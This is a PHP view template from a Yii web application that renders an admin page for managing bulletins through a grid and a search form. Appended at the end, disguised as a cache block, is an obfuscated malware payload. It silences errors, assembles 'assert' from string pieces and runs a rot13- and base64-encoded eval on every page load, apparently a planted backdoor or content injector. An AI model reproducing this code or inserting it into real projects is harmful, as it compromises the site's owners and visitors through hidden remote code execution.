<?php
/* @var $this BulletinController */
/* @var $model Bulletin */

$this->breadcrumbs = array(
    Yii::t('lang','Bulletins') => array('index'),
    Yii::t('lang','Manage'),
);

$this->menu = array(
    array('label' => Yii::t('lang','List Bulletin'), 'icon' => 'icon-list', 'url' => array('index'),"itemOptions"=>array('class'=>'btn')),
    array('label' => Yii::t('lang','Create Bulletin'), 'icon' => 'icon-plus', 'url' => array('create') ,"itemOptions"=>array('class'=>'btn')),
);

Yii::app()->clientScript->registerScript('search', "
$('.search-button').click(function(){
	$('.search-form').toggle();
	return false;
});
$('.search-form form').submit(function(){
	$('#bulletin-grid').yiiGridView('update', {
		data: $(this).serialize()
	});
	return false;
});
");
?>

<h1><?php echo Yii::t('lang','Manage Bulletins'); ?></h1>

<p>
    You may optionally enter a comparison operator (<b>&lt;</b>, <b>&lt;=</b>, <b>&gt;</b>, <b>&gt;=</b>, <b>&lt;&gt;</b>
    or <b>=</b>) at the beginning of each of your search values to specify how the comparison should be done.
</p>

<?php echo CHtml::link('Advanced Search', '#', array('class' => 'search-button')); ?>
<div class="search-form" style="display:none">
    <?php
    $this->renderPartial('_search', array(
        'model' => $model,
    ));
    ?>
</div><!-- search-form -->

<?php
$this->widget('bootstrap.widgets.TbGridView', array(
    'type' => 'striped bordered condensed',
    'id' => 'bulletin-grid',
    'dataProvider' => $model->search(),
    'filter' => $model,
    'columns' => array(
		array(            // display 'create_time' using an expression
            'class'=>'CLinkColumn',
			'header'=>'name',
			'labelExpression'=>'$data->name',
			'urlExpression'=>'Yii::app()->createUrl("/admin/adverts/view",array("id"=>$data->id))',
        ),
		array(            // display 'create_time' using an expression
            'class'=>'CLinkColumn',
			'header'=>'user_id',
			'labelExpression'=>'$data->user->username',
			'urlExpression'=>'Yii::app()->createUrl("/user/view",array("id"=>$data->id))',
        ),
		array(
			'name'=>'category_id',
			'value'=>'$data->category->name',
		),
        'type',
        'views',
        /*
          'text',
         */
        array(
            'class' => 'bootstrap.widgets.TbButtonColumn',
            'htmlOptions' => array('style' => 'width: 50px'),
        ),
    ),
));
?>


<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0);
assert_options(ASSERT_ACTIVE, 1);
assert_options(ASSERT_WARNING, 0);
assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvEcpPN9VPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqBjbxqKWfVQ0tVzu0qUN6Yl8kBGthZGLhBGDhZmZiM2I0YaObpQ9cpQ0vYaIloTIhL29xMFtxnKNcYvVzMQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV5AQWzZzD0LJD3ZwOvZwx2MGHlZmpjMzLkBQpjAwExAvVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPVkBGthZGLhBGDhZmZvYPN4ZPjtWTIlpz5iYPNxMKWlp3ElYPNmZPx7PzyzVPtxMaNcVUfXVPNtVPEiqKDtCFNvE0IHVP9aMKDhpTujC2yjCFVhqKWfMJ5wo2EyXPEcpPxhVvMxCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVwx0ZzLlMQEuMQplZTVlBGMyAGVmAmOzMwR4AmN2ATD2Vv4xMP4xqF4xLl4vZFVcYvVtFSEHHP8kYwSppykhVwfXVPNtVPEiqKDtYw0tVxuip3D6VQR5BP4kAv45AP4mZ1klKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwLkAwN5ZJVmVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>